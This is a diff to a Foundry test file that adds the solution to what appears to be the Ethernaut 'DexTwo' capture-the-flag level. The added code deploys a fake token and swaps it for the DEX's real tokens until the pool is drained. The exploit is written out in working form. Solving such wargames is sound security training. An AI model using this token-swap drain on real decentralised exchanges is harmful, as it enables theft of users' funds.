@@ -25,7 +25,11 @@ contract TestDexTwo is Test {
     function testSolution() public {
         vm.startPrank(player);
 
-        // Your exploit goes here
+        SwappableTokenTwo maliciousToken = new SwappableTokenTwo(address(instance), "maliciousToken", "MT", 10_000_000);
+        maliciousToken.transfer(address(instance), 100);
+        maliciousToken.approve(player, address(instance), 300);
+        instance.swap(address(maliciousToken), address(t1), 100);
+        instance.swap(address(maliciousToken), address(t2), 200);
 
         uint256 totalBalance = t1.balanceOf(address(instance)) + t2.balanceOf(address(instance));
         assertEq(totalBalance, 0);
